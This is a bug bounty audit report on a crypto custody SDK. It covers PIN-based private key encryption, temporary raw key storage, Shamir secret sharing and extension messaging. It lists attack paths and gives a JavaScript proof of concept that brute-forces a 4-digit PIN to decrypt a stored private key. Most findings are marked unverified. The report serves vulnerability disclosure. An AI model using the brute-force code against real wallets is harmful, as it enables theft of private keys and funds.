# 🔐 Verified Custody SDK - Security Audit Report
## Bug Bounty Research - Verified Network Christmas Challenge

**Package:** `@verified-network/verified-custody@0.4.9`  
**Network:** BASE Mainnet  
**Researcher:** 0xsupremedev  
**Date:** 2025-12-26  

---

## 📋 Executive Summary

This report documents the security analysis of the Verified Custody SDK, focusing on:
- Key Management & Wallet Recovery
- Transaction Signing & Custody Logic
- Encryption/Decryption implementation
- Shamir Secret Sharing implementation

---

## 🎯 Attack Surface Analysis

### 1. Cryptographic Implementation

#### 1.1 PIN-Based Key Derivation (⚠️ POTENTIAL CRITICAL)

**Location:** `hashTheString` function exported from SDK

**Finding:** The SDK uses a 4-digit PIN to encrypt private keys.

```javascript
// From source analysis
const hashTheString = (text: string) => string;  // SHA-256 hash
const encryptString = (text: string, secretKey: string) => string;  // AES encryption
```

**Concern:** 
- 4-digit PIN = only 10,000 possible combinations
- Brute-forcing encrypted private key is feasible
- PIN hash is used directly as encryption key

**Exploitation Path:**
1. Obtain encrypted private key from on-chain storage
2. Brute-force all 10,000 PIN combinations
3. Decrypt to recover private key

---

#### 1.2 Shamir Secret Sharing Implementation

**Library:** `shamir-secret-sharing@0.0.4`

**Code Analysis:**
```javascript
// WARNING comment found in source:
// WARNING: This shuffle is biased and should NOT be used if an unbiased shuffle is required.
```

**Finding:** The coordinate shuffling uses a biased random shuffle:
```javascript
const j = randomIndices[i] % 255; // Modulo bias present
```

**Impact:** While the library notes this doesn't affect Shamir security properties, the biased shuffle could potentially:
- Allow statistical analysis of share distribution
- Reduce entropy in coordinate selection

---

#### 1.3 Passkey-Based Encryption

**Functions:**
- `encryptWithPasskey(plaintext, rawId, rawIdString)`
- `decryptWithPasskey(encryptedString, rawId)`

**Implementation Analysis:**
```javascript
// Uses PBKDF2 with 300,000 iterations
const key = pbkdf2(sha256, rawId, salt, { c: 300000, dkLen: 32 });
// Uses AES-GCM for encryption
const encrypted = gcm(key, nonce).encrypt(data);
```

**Concern:** 
- Salt generation includes PIN in derivation
- Salt format: `hash(rawIdString:randomSalt)`
- If rawIdString is predictable, reduces security

---

### 2. Key Management Logic

#### 2.1 Private Key Storage (⚠️ HIGH)

**Storage Locations:**
- `chrome.storage.local` (browser extension)
- `localStorage` (web)
- `AsyncStorage` (React Native)

**Finding:** Encrypted private keys stored in:
```javascript
await chrome.storage.local.set({
  myVault: JSON.stringify({
    address: address,
    vaultId: vaultId,
    hashedVaultId: hashedVaultId,
    pk: encryptedPk,  // Encrypted with 4-digit PIN
    channel: channel
  })
});
```

**Attack Vector:**
1. Access `chrome.storage.local` or `localStorage`
2. Extract encrypted `pk` value
3. Brute-force 4-digit PIN (10,000 combinations)

---

#### 2.2 Temporary Private Key Exposure (⚠️ CRITICAL)

**Finding:** During vault creation, raw private key is temporarily stored:

```javascript
await chrome.storage.local.set({ lastPk: pk });  // RAW private key!
// ... later removed after confirmation
await chrome.storage.local.remove("lastPk");
```

**Attack Window:**
- Between `createVault` and `confirmParticipant` calls
- Raw private key accessible in storage
- Race condition exploitation possible

---

### 3. Co-Signer & Recovery Logic

#### 3.1 Quorum Bypass Potential

**Functions analyzed:**
- `defineQuorum(hashedVaultId, threshold)`
- `checkQuorum(hashedVaultId, txId)`
- `getShards(hashedVaultId, txId)`

**Finding:** Quorum validation happens on-chain but share reconstruction happens client-side.

**Concern:**
- If attacker collects enough shares from different sources
- Can reconstruct private key without proper quorum validation
- Share format: comma-separated byte values (CSV string)

---

#### 3.2 Recovery Flow Analysis

**Recovery Process:**
1. `promptSignatures()` - Initiate recovery
2. `signTransaction()` - Co-signers approve
3. `getShards()` - Retrieve encrypted shares
4. `combine()` - Shamir reconstruction

**Potential Issue:**
- Shares are encrypted with same PIN
- PIN brute-force on one share = all shares decrypted

---

### 4. Transaction Signing

#### 4.1 Signing Flow

**SDK allows these transaction types:**
- `eth_sendTransaction`
- `signRecovery`
- `completeRecovery`

**Event-based communication:**
```javascript
chrome.runtime.sendMessage({
  type: "eth_sendTransaction",
  value: { vaultData, txData }
});
```

**Concern:**
- Message passing between extension components
- No signature on internal messages
- Content script injection could intercept

---

## 🔴 Critical Findings Summary

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | 4-digit PIN encryption (brute-forceable) | **CRITICAL** | To Verify |
| 2 | Temporary raw PK storage during creation | **CRITICAL** | To Verify |
| 3 | Biased shuffle in Shamir coordinates | **LOW** | Documented |
| 4 | Client-side share reconstruction | **MEDIUM** | To Verify |
| 5 | PIN hash used as encryption key | **HIGH** | To Verify |

---

## 🛠️ Proof of Concept Development

### PoC #1: PIN Brute-Force Attack

```javascript
const { decryptString } = require('@verified-network/verified-custody');
const { encodeBytes32String } = require('ethers');

async function bruteForcePIN(encryptedPK) {
  for (let pin = 0; pin <= 9999; pin++) {
    const pinStr = pin.toString().padStart(4, '0');
    const hashedPin = encodeBytes32String(pinStr);
    
    try {
      const decrypted = decryptString(encryptedPK, hashedPin);
      if (decrypted && decrypted.length === 64) { // hex private key length
        console.log(`[SUCCESS] PIN: ${pinStr}`);
        console.log(`Private Key: ${decrypted}`);
        return { pin: pinStr, privateKey: decrypted };
      }
    } catch (e) {
      // Decryption failed, wrong PIN
      continue;
    }
  }
  return null;
}
```

---

## 📁 Files Analyzed

- `node_modules/@verified-network/verified-custody/dist/index.mjs`
- `node_modules/@verified-network/verified-custody/dist/index.d.ts`
- `node_modules/shamir-secret-sharing/index.js`
- Package dependencies (ethers, crypto-js, @noble/ciphers)

---

## 📝 Next Steps

1. [ ] Write PoC for PIN brute-force attack
2. [ ] Test temporary PK storage race condition
3. [ ] Analyze on-chain contract for quorum bypass
4. [ ] Test extension message interception
5. [ ] Submit findings to DoraHacks

---

## 📚 References

- SDK NPM: https://npmjs.com/package/@verified-network/verified-custody
- Shamir Library: https://npmjs.com/package/shamir-secret-sharing
- Discord: https://discord.gg/cJh5WDGjGV
